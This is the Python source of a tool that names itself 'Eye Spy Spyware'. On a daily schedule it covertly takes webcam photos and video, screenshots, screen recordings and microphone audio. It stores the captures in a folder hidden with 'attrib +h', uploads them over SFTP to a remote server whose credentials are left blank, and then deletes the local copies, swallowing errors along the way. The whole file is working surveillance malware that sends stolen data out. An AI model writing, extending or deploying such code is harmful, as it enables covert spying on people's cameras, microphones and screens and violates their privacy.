import argparse
import sys
import re
import datetime
import os
import time
import numpy
import cv2
import sounddevice
import paramiko
import pyautogui
from scipy.io.wavfile import write
import threading
import schedule

ssh_host = ""
ssh_port = ""
ssh_username = ""
ssh_password = ""
#path of folder created on users device
local_file_path = ""

#path of folder created on server
remote_file_path = ""  


def parse_time(time_str):
    try:
        #remove bulck
        time_str = time_str.lower().replace(" ", "")
        
        #check time format
        if not re.match(r'^\d{1,2}:\d{2}(am|pm)$', time_str):
            raise ValueError("Invalid time format. Use format like '3:30pm' or '10:45am'")
            
        #parse the time
        time = datetime.datetime.strptime(time_str, "%I:%M%p")
        # Return both formats
        return {
            'display': time.strftime("%I:%M%p").lower(),  
            'schedule': time.strftime("%H:%M"),
        }
    except ValueError as e:
        raise argparse.ArgumentTypeError(str(e))


def parse_duration(value):
    try:
        minutes = int(value)
        if minutes <= 0:
            raise argparse.ArgumentTypeError("Duration must be greater than 0 minutes")
        return minutes
    except ValueError:
        raise argparse.ArgumentTypeError(f"'{value}' Please use positive integer")


def parser():
    parser = argparse.ArgumentParser(description='Eye Spy Spyware Configuration')

    
    parser.add_argument('-EnableWebcamPhoto', action='store_true', help='Enable webcam photo functionality')
    parser.add_argument('-EnableScreenshot', action='store_true', help='Enable screenshot functionality')
    parser.add_argument('-EnableScreenRecord', action='store_true', help='Enable screen recording functionality')
    parser.add_argument('-EnableWebcamVideo', action='store_true', help='Enable webcam video functionality')
    parser.add_argument('-EnableMicrophoneRecording', action='store_true', help='Enable microphone recording functionality')

    #pacific time only
    parser.add_argument('-TimeForWebcamPhoto', nargs='*', type=parse_time, help='Time settings for webcam photo (ex: "3:30pm")')
    parser.add_argument('-TimeForScreenshot', nargs='*', type=parse_time, help='Time settings for screenshot (ex: "3:30pm")')
    parser.add_argument('-TimeForScreenRecord', nargs='*', type=parse_time, help='Time settings for screen recording (ex: "3:30pm")')
    parser.add_argument('-TimeForWebcamVideo', nargs='*', type=parse_time, help='Time settings for webcam video (ex: "3:30pm")')
    parser.add_argument('-TimeForMicrophoneRecording', nargs='*', type=parse_time, help='Time settings for microphone recording (ex: "3:30pm")')

    #in seconds
    parser.add_argument('-DurationForScreenRecord', type=int, help='Duration for screen recording in seconds')
    parser.add_argument('-DurationForWebcamVideo', type=int, help='Duration for webcam video in seconds')
    parser.add_argument('-DurationForMicrophoneRecording', type=int, help='Duration for microphone recording in seconds')

    parser.add_argument('-v', '--version', action='version', version='v1.0')


    args = parser.parse_args()

    if(len(sys.argv[1:]) == 0):
        sys.exit("No Arguments given, Use -h")

    # Check required arguments
    if args.EnableWebcamPhoto and not args.TimeForWebcamPhoto:
        parser.error("Error: -TimeForWebcamPhoto is required when -EnableWebcamPhoto is enabled")

    if args.EnableScreenshot and not args.TimeForScreenshot:
        parser.error("Error: -TimeForScreenshot is required when -EnableScreenshot is enabled")

    if args.EnableScreenRecord:
        if not args.TimeForScreenRecord:
            parser.error("Error: -TimeForScreenRecord is required when -EnableScreenRecord is enabled")
        if not args.DurationForScreenRecord:
            parser.error("Error: -DurationForScreenRecord is required when -EnableScreenRecord is enabled")

    if args.EnableWebcamVideo:
        if not args.TimeForWebcamVideo:
            parser.error("Error: -TimeForWebcamVideo is required when -EnableWebcamVideo is enabled")
        if not args.DurationForWebcamVideo:
            parser.error("Error: -DurationForWebcamVideo is required when -EnableWebcamVideo is enabled")

    if args.EnableMicrophoneRecording:
        if not args.TimeForMicrophoneRecording:
            parser.error("Error: -TimeForMicrophoneRecording is required when -EnableMicrophoneRecording is enabled")
        if not args.DurationForMicrophoneRecording:
            parser.error("Error: -DurationForMicrophoneRecording is required when -EnableMicrophoneRecording is enabled")

    
    
    return args  


def save_file(name, extension):
    timestamp = time.strftime("%d-%m-%Y_%I-%M-%S_%p")
    file_name = f"{name}_{timestamp}.{extension}"

    try:
        #path of local machine where file will be saved forshort time
        path = ""
        os.makedirs(path, exist_ok=True)
        
        # Hide the folder after creating it
        hide_folder(path)
        
        return os.path.join(path, file_name)
    except Exception as e:
        pass


def delete_file(file):
    if os.path.exists(file):
        os.remove(file)
    else:
        pass


def hide_folder(folder_path):
    os.system(f'attrib +h "{folder_path}"')


def send_file(host, port, username, password, local_file_path, remote_dir_path):
    
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=host, port=int(port), username=username, password=password)
        
        #sftp connection to send file
        sftp = ssh.open_sftp()
        
        
        filename = os.path.basename(local_file_path)
        remote_dir_path = remote_dir_path.replace('/', '\\')
        remote_file = f"{remote_dir_path}\\{filename}"
        
        try:
            sftp.stat(remote_dir_path)
        except FileNotFoundError:
            #create directory
            stdin, stdout, stderr = ssh.exec_command(f'mkdir "{remote_dir_path}"')
        
        # send file
        sftp.put(local_file_path, remote_file)
        print("File sent to server.")
        
        sftp.close()
        ssh.close()
        
    except Exception as e:
        
        sftp.close()
        ssh.close()
        

def microphone_record(duration):
    try:
        sampling_rate = 48000
        #breaks when i have headphones
        audio = sounddevice.rec(int(sampling_rate*duration), samplerate=sampling_rate, channels=2, dtype='int16')
        sounddevice.wait()
        file = save_file("Microphone Recording","wav")
        if file:
            write(file, sampling_rate, audio)
            # Send and delete file
            send_file(ssh_host, ssh_port, ssh_username, ssh_password, file, remote_file_path)
            delete_file(file)
    except Exception:
        pass


def screenshot():
    file = save_file("Screenshot","png")
    screenshot = pyautogui.screenshot()
    screenshot.save(file)
    
    send_file(ssh_host, ssh_port, ssh_username, ssh_password, file, remote_file_path)
    delete_file(file)


def webcam_photo():
    camera = cv2.VideoCapture(0)
    try:
        ret, frame = camera.read()
        if ret:
            file = save_file("Webcam Photo", "jpg")
            cv2.imwrite(file, frame)
            
            send_file(ssh_host, ssh_port, ssh_username, ssh_password, file, remote_file_path)
            delete_file(file)
    finally:
        camera.release()
        cv2.destroyAllWindows()


def screenrecord(duration):
    screen_width, screen_height = pyautogui.size()
    fourcc = cv2.VideoWriter.fourcc(*"mp4v")
    fps = 10
    file = save_file("Screen Recording","mp4")
    out = cv2.VideoWriter(file, fourcc, fps, (screen_width, screen_height))
    
    start_time = time.time()
    
    while time.time() - start_time < duration:
        screenshot = pyautogui.screenshot()
        frame = numpy.array(screenshot)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
        out.write(frame)

    out.release()
    send_file(ssh_host, ssh_port, ssh_username, ssh_password, file, remote_file_path)
    delete_file(file)


def webcam_video(duration):
    camera = cv2.VideoCapture(0)
    try:
        if not camera.isOpened():
            return

        width = int(camera.get(cv2.CAP_PROP_FRAME_WIDTH))
        height = int(camera.get(cv2.CAP_PROP_FRAME_HEIGHT))

        file = save_file("Webcam_video", "avi")
        fourcc = cv2.VideoWriter_fourcc(*"XVID")
        out = cv2.VideoWriter(file, fourcc, 20.0, (width, height))

        start_time = time.time()
        while time.time() - start_time < duration:
            ret, frame = camera.read()
            if not ret:
                break
            out.write(frame)

        out.release()
        send_file(ssh_host, ssh_port, ssh_username, ssh_password, file, remote_file_path)
        delete_file(file)
    finally:
        camera.release()
        cv2.destroyAllWindows()


#schedule tasks
def schedule_action(action_func, times, duration=None):
    for time_dict in times:
        time_str = time_dict['schedule']
        if duration is not None:
            schedule.every().day.at(time_str).do(action_func, duration)
        else:
            schedule.every().day.at(time_str).do(action_func)
        if duration is not None:
            print(f"Scheduled {action_func.__name__} at {time_dict['display']} for {duration} seconds")
        else:
            print(f"Scheduled {action_func.__name__} at {time_dict['display']}")

def run_scheduler():
    while True:
        schedule.run_pending()
        time.sleep(1)

def main():
    print("""
                     ..,,;;;;;;,,,,
       .,;'';;,..,;;;,,,,,.''';;,..
    ,,''                    '';;;;,;''    EYE SPY SPYWARE ACTIVE IN LOCAL MACHINE
   ;'    ,;@@;'  ,@@;, @@, ';;;@@;,;';.
  ''  ,;@@@@@'  ;@@@@; ''    ;;@@@@@;;;;
     ;;@@@@@;    '''     .,,;;;@@@@@@@;;;
    ;;@@@@@@;           , ';;;@@@@@@@@;;;.
     '';@@@@@,.  ,   .   ',;;;@@@@@@;;;;;;
        .   '';;;;;;;;;,;;;;@@@@@;;' ,.:;'
          ''..,,     ''''    '  .,;'
               ''''''::''''''''

        """)
    
    args = parser()
    
    #sechedule actions
    if args.EnableWebcamPhoto and args.TimeForWebcamPhoto:
        schedule_action(webcam_photo, args.TimeForWebcamPhoto)
    
    if args.EnableScreenshot and args.TimeForScreenshot:
        schedule_action(screenshot, args.TimeForScreenshot)
    
    if args.EnableScreenRecord and args.TimeForScreenRecord:
        schedule_action(screenrecord, args.TimeForScreenRecord, args.DurationForScreenRecord) 
    
    if args.EnableWebcamVideo and args.TimeForWebcamVideo:
        schedule_action(webcam_video, args.TimeForWebcamVideo, args.DurationForWebcamVideo)  
    
    if args.EnableMicrophoneRecording and args.TimeForMicrophoneRecording:
        schedule_action(microphone_record, args.TimeForMicrophoneRecording, args.DurationForMicrophoneRecording)  
    
    #start the scheduler
    scheduler_thread = threading.Thread(target=run_scheduler)
    scheduler_thread.daemon = True
    scheduler_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nShutting down EYE SPY SPYWARE...")

if __name__ == "__main__":
    main()
